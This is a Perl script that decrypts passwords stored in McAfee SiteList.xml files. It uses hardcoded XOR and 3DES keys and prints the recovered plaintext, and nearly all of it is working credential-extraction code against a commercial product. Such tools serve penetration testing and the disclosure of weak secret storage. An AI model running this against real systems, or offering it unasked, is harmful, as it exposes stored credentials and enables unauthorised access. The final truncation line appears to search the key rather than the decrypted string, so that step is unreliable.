#!/usr/bin/env perl
#
# Author:   Aut0exec
# Version:  V0.1
# Date:     August 23, 2022
# Synopsis: McAfee Sitelist.xml password decryption tool perl re-write
# 			Original Python implementation:
#    			Jerome Nokin (@funoverip)  - Feb 2016
#
# Reqs:		Debs: libltdl-dev libmcrypt-dev cpanminus libdigest-sha-perl
#			cpan modules: Mcrypt
#
# To Do: 
#
# Known issues:
#
###########################################################################

use strict;
use warnings;
use Digest::SHA qw(sha1);
use Mcrypt qw(3DES ECB);
use MIME::Base64;

sub usage {
	print ("Usage:  $0 <McAfee_Base64_Password>\n");
	print ("\t$0 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='\n");
	exit 1;
}

usage unless defined $ARGV[0];

my $mc_string = decode_base64($ARGV[0]);
my $xor_key = pack("H*", "12150F10111C1A060A1F1B1817160519");
my $iv = pack("H*", '0000000000000000');
my $dec_key = (Digest::SHA->new(1)->add('<!@#$%^>')->digest);
$dec_key .= ("\x00" x (21 - length($dec_key)));
my $enc_pass = '';
my $dec_str = '';
my $i = 0;

# Xor each byte in the McAfee array with a byte in the key array
foreach (split(//, $mc_string))
{
	$enc_pass .= $_ ^ substr($xor_key, $i%16, 1);
	$i++;
}

my $algo = Mcrypt->new( algorithm => Mcrypt::3DES, mode => Mcrypt::ECB );
$algo->init($dec_key, $iv);

for ( my $i = 0; $i < int(length($enc_pass)/8); $i++)
{ $dec_str .= $algo->decrypt(substr($enc_pass,$i*8,8)); }

$dec_str = substr($dec_str, 0, index($dec_key, "\x00"));
print ("Decrypted password is: $dec_str \n");
